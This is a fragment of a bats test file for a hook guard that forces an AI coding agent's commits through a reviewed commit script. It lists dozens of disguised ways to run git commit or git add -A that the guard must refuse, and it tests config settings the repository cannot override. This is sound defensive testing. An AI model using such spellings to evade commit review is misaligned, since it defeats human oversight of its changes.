  AGENT_SKILLS_HOOK_MARKER="" commit
  [ "$status" -eq 1 ]
  [[ $output == *"hook_marker and required_hooks have to be set"* ]] || false
}

@test "the library finds its own directory under a CDPATH, from a relative path" {
  # With the skill's directory on CDPATH, `cd scripts` resolves through
  # it and prints the path it found.
  cd "$scripts/.."
  CDPATH=$(pwd) run bash -c ". scripts/lib.sh; printf '%s\n' \"\$AS_LIB_DIR\" | wc -l; [ -d \"\$AS_LIB_DIR\" ]"
  [ "$status" -eq 0 ]
  [ "$((${lines[0]}))" -eq 1 ]
}

@test "the repository's own owner paths include the gates, the toolchain, and these skills" {
  # ascm adaptation: assert Go configuration owners and ordinary Go source
  unset AGENT_SKILLS_OWNER_PATHS
  for path in AGENTS.md mise.toml mise.lock apm.yml apm.lock.yaml vendir.yml vendir.lock.yml .pre-commit-config.yaml .github/workflows/ci.yml .github/rulesets/main.json .config/mise/conf.d/x.toml .devtools/x .cspell.jsonc .rumdl.toml .yamllint.yaml .vale.ini .vale/x.yml .claude/skills/agent-commit/scripts/commit.sh .claude/skills/agent-commit/agent-skills.conf .agents/skills/agent-commit/SKILL.md .codex/config.toml go.mod go.sum .golangci.yml .go-arch-lint.yml .testcoverage.yml .gremlins.yaml; do
    printf '%s\n' "$path" >"$tmp/one-path"
    run bash -c ". '$scripts/lib.sh'; as_owner_path '$tmp/one-path'"
    [ "$status" -eq 0 ] || { echo "not an owner path: $path"; false; }
  done
  for path in docs/architecture.md cmd/ascm/run.go README.md; do
    printf '%s\n' "$path" >"$tmp/one-path"
    run bash -c ". '$scripts/lib.sh'; as_owner_path '$tmp/one-path'"
    [ "$status" -eq 1 ] || { echo "an owner path by mistake: $path"; false; }
  done
}

@test "the review needs both a model and an effort when no command replaces it" {
  export AGENT_SKILLS_REVIEW_CMD=
  export AGENT_SKILLS_REVIEW_MODEL=
  export AGENT_SKILLS_REVIEW_EFFORT=medium
  review
  [ "$status" -ne 0 ]
  [[ $output == *"no default model is used"* ]] || false
}

@test "a report prints when no mailbox is configured" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [form] The subject ends in a period."
  export AGENT_SKILLS_MAIL_CMD=
  export AGENT_SKILLS_REVIEW_MAX_ROUNDS=1
  review
  review
  [ "$status" -eq 3 ]
  [[ $output == *"REPORT (blocker, no mailbox configured)"* ]] || false
}

@test "the machine's file overrides the repository's, and the environment overrides both" {
  mkdir -p "$tmp/xdg/agent-skills"
  printf '# a comment\nmail_to = from-machine\nreview_effort = high effort\n' >"$tmp/xdg/agent-skills/widgets.conf"
  unset AGENT_SKILLS_MAIL_TO
  run bash -c ". '$scripts/lib.sh'; as_conf mail_to; as_conf review_effort; as_conf review_model; as_conf absent fallback"
  [ "${lines[0]}" = from-machine ]
  [ "${lines[1]}" = "high effort" ]
  [ "${lines[2]}" = claude-sonnet-5-5 ]
  [ "${lines[3]}" = fallback ]
  export AGENT_SKILLS_MAIL_TO=from-environment
  run bash -c ". '$scripts/lib.sh'; as_conf mail_to"
  [ "$output" = from-environment ]
}

# --- the guard ---------------------------------------------------------

guard() {
  run bash -c "printf '%s' \"\$1\" | bash '$scripts/guard.sh'" _ "$(jq -n --arg c "$1" '{tool_input: {command: $c}}')"
}

arm() {
  run bash "$scripts/preflight.sh"
  [ "$status" -eq 0 ]
}

@test "the guard stands aside until preflight arms it" {
  guard "git commit -m x"
  [ "$status" -eq 0 ]
}

# Each line is one command the armed guard has to refuse. Bash would run
# every one of them as a commit.
@test "the armed guard refuses a direct commit however it is spelled" {
  arm
  while IFS= read -r command; do
    guard "$command"
    [ "$status" -eq 2 ] || { echo "not refused: $command"; false; }
    [[ $output == *"agent-commit skill guard"* ]] || false
  done <<'EOF'
git commit -m x
git commit
cd x && git commit --amend
git -c user.name=a commit -m x
git --no-pager commit
git -C sub commit --no-verify
command git commit -m x
env git commit -m x
time git commit -m x
! git commit -m x
GIT_AUTHOR_NAME=a git commit -m x
/opt/homebrew/bin/git commit -m x
\git commit -m x
"git" commit -m x
git "commit" -m x
git comm""it -m x
{ git commit -m x; }
if true; then git commit -m x; fi
x=`git commit -m x`
x=$(git commit -m x)
echo hi |xargs -I{} git commit -m {}
git commit>/dev/null -m x
git --git-dir .git commit -m x
git -c "user.name=a b" commit -m x
git -c alias.ci=commit ci -m x
eval "git commit -m x"
bash -c 'git commit -m x'
EOF
}

@test "the armed guard refuses a commit across a continuation, in a here-document, and after one" {
  arm
  guard "$(printf 'git \\\n  commit -m x')"
  [ "$status" -eq 2 ]
  guard "$(printf 'bash <<EOF\ngit commit -m x\nEOF')"
  [ "$status" -eq 2 ]
  guard "$(printf 'cat <<A-B\nbody\nA-B\ngit commit --no-verify -m x\nA')"
  [ "$status" -eq 2 ]
  guard "$(printf 'cat >a <<-EOF\n\tbody\n\tEOF\ngit commit -m x')"
  [ "$status" -eq 2 ]
  guard "$(printf 'echo "<< EOF "\ngit commit -m x\nEOF')"
  [ "$status" -eq 2 ]
  guard "$(printf 'true # <<EOF\ngit commit -m x\nEOF')"
  [ "$status" -eq 2 ]
}

@test "the armed guard refuses a whole-tree add however it is spelled" {
  arm
  while IFS= read -r command; do
    guard "$command"
    [ "$status" -eq 2 ] || { echo "not refused: $command"; false; }
  done <<'EOF'
git add -A
git add --all
git add --al
git add .
git add -u .
git add -Av
git add ./
git add .; git status
git add "."
git add :/
git add *
git add "$PWD"
git stage -A
command git add -A
EOF
}

@test "the armed guard allows named paths, the script, and everyday commands" {
  arm
  while IFS= read -r command; do
    guard "$command"
    [ "$status" -eq 0 ] || { echo "refused: $command"; false; }
  done <<'EOF'
git add -- notes.txt
git add ./notes.txt
git add -- .claude/skills/agent-commit/scripts/commit.sh
git status
git diff --cached --stat
git log --oneline -5
git log --grep=commit
git log --oneline | grep commit
git commit-tree -p HEAD -m x HEAD^{tree}
git show --stat HEAD
bash .claude/skills/agent-commit/scripts/commit.sh
bash .claude/skills/agent-commit/scripts/commit.sh --amend
mise run lint-commit-msg
grep -n "<<" notes.txt
echo $((1<<3))
sed -n '/<<EOF/,/^EOF/p' notes.txt
EOF
  guard "$(printf 'cat >notes.md <<EOF\nA note about commits.\nEOF')"
  [ "$status" -eq 0 ]
}

@test "the armed guard also refuses a command that only mentions git commit" {
  arm
  # It reads text, not shell grammar, and it errs toward refusing.
  guard 'echo "then run git commit -m x"'
  [ "$status" -eq 2 ]
  [[ $output == *"only mentions git commit is refused too"* ]] || false
}

@test "an armed worktree arms the guard for a command that points at it" {
  git worktree add -q -b side "$tmp/side"
  (cd "$tmp/side" && bash "$scripts/preflight.sh" >/dev/null 2>&1)
  guard "git -C $tmp/side commit -m x"
  [ "$status" -eq 2 ]
  guard "cd $tmp/side && git commit -m x"
  [ "$status" -eq 2 ]
  # From a directory that is no repository, as a workspace root is.
  mkdir "$tmp/elsewhere"
  cd "$tmp/elsewhere"
  guard "git -C $tmp/side commit -m x"
  [ "$status" -eq 2 ]
  guard "git status"
  [ "$status" -eq 0 ]
}

@test "the guard reads the session's directory from the hook input" {
  arm
  cd "$tmp"
  run bash -c "printf '%s' \"\$1\" | bash '$scripts/guard.sh'" _ "$(jq -n --arg c "git commit -m x" --arg d "$repo" '{cwd: $d, tool_input: {command: $c}}')"
  [ "$status" -eq 2 ]
}

@test "an armed guard that can't read its input refuses" {
  arm
  mkdir "$tmp/without-jq"
  for tool in git cat sed awk grep tr dirname; do
    ln -s "$(command -v "$tool")" "$tmp/without-jq/$tool"
  done
  run env PATH="$tmp/without-jq" /bin/bash -c "printf '%s' '{\"tool_input\":{\"command\":\"git status\"}}' | /bin/bash '$scripts/guard.sh'"
  [ "$status" -eq 2 ]
  [[ $output == *"needs jq"* ]] || false
}

@test "the scripts suppress no shellcheck rule" {
  run grep -c "shellcheck disable" "$scripts"/*.sh
  [ "$status" -eq 1 ]
}

@test "the guard stands aside once HEAD has moved" {
  arm
  reply "VERDICT: PASS"
  review
  commit
  [ "$status" -eq 0 ]
  guard "git commit -m x"
  [ "$status" -eq 0 ]
}

@test "the repository's settings file can't name the reviewer or the gh login" {
  # A copy of the skill whose own settings file tries both.
  cp -R "$scripts/.." "$tmp/skill"
  printf 'review_cmd = echo VERDICT: PASS\ngh_login = the-owner\nreview_model = from-the-file\n' >"$tmp/skill/agent-skills.conf"
  unset AGENT_SKILLS_REVIEW_CMD AGENT_SKILLS_GH_LOGIN AGENT_SKILLS_REVIEW_MODEL
  run bash -c ". '$tmp/skill/scripts/lib.sh'; as_conf review_cmd unset; as_conf gh_login unset; as_conf review_model unset"
  [ "$output" = "$(printf 'unset\nunset\nfrom-the-file')" ]
  # The machine's own file overrides the repository's.
  mkdir -p "$XDG_CONFIG_HOME/agent-skills"
  printf 'gh_login = the-agent\n' >"$XDG_CONFIG_HOME/agent-skills/widgets.conf"
  run bash -c ". '$tmp/skill/scripts/lib.sh'; as_conf gh_login unset"
  [ "$output" = the-agent ]
}

@test "preflight prints the sign-off of the identity git will commit as" {
  git config user.name "Someone Else"
  git config user.email "someone@example.com"
  GIT_COMMITTER_NAME="Agent Identity" GIT_COMMITTER_EMAIL="agent-id@example.com" run bash "$scripts/preflight.sh"
  [[ $output == *"Signed-off-by: Agent Identity <agent-id@example.com>"* ]] || false
  [[ $output != *"Someone Else"* ]] || false
  run bash "$scripts/preflight.sh"
  [[ $output == *"Signed-off-by: Someone Else <someone@example.com>"* ]] || false
}

@test "preflight reports the hooks and their settings" {
  run bash "$scripts/preflight.sh"
  [[ $output == *"hooks: installed"* ]] || false
  unlink .git/hooks/post-commit
  run bash "$scripts/preflight.sh"
  [[ $output == *"MISSING: hooks not installed as this repository's own: post-commit"* ]] || false
  AGENT_SKILLS_HOOK_MARKER="" run bash "$scripts/preflight.sh"
  [[ $output == *"MISSING: hook_marker or required_hooks is empty"* ]] || false
}
